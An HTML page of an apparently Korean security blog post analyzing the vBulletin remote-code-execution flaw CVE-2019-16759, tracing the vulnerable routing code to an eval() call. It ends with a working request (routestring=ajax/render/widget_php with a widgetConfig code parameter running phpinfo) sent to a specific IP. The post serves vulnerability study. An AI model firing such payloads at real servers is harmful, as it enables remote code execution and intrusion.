<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다.     CVE ID Version CVSS    CVE-2019-16759 5.x ~ 5.5.4 9.8">
<meta property="og:type" content="article">
<meta property="og:title" content="0-day RCE in vBulletin">
<meta property="og:url" content="http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/index.html">
<meta property="og:site_name" content="Home">
<meta property="og:description" content="vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다.     CVE ID Version CVSS    CVE-2019-16759 5.x ~ 5.5.4 9.8">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-01-20T00:00:00.000Z">
<meta property="article:modified_time" content="2021-03-26T06:22:13.789Z">
<meta property="article:author" content="Jeongwon Jo">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="0-day">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>0-day RCE in vBulletin</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/01/25/2021-01-25-CVE-2021-3129/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/01/03/2021-01-03-TetCTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&text=0-day RCE in vBulletin"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&is_video=false&description=0-day RCE in vBulletin"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0-day RCE in vBulletin&body=Check out this article: http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&title=0-day RCE in vBulletin"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&name=0-day RCE in vBulletin&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/&t=0-day RCE in vBulletin"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-16759"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-16759</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-16759-Patch"><span class="toc-number">2.</span> <span class="toc-text">CVE-2019-16759 Patch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-7373"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-7373</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-7373-Patch"><span class="toc-number">4.</span> <span class="toc-text">CVE-2020-7373 Patch</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        0-day RCE in vBulletin
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Jeongwon Jo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-01-20T00:00:00.000Z" itemprop="datePublished">2021-01-20</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CVE/">CVE</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/0-day/" rel="tag">0-day</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><strong>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다. </strong><br><br></p>
<table>
<thead>
<tr>
<th>CVE ID</th>
<th>Version</th>
<th>CVSS</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2019-16759</td>
<td>5.x ~ 5.5.4</td>
<td>9.8</td>
</tr>
<tr>
<td>CVE-2020-7373</td>
<td>5.5.4 ~ 5.6.2</td>
<td>9.8</td>
</tr>
</tbody></table>
<p><br><strong>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.<strong><br></p>
<p><strong>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</strong><br><br></p>
<hr>
<h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a><em>CVE-2019-16759</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure>
<p><strong>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 __construct 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.</strong><br></p>
<p><strong>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</strong><br><br></p>
<p><strong>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</strong><br><br></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure>
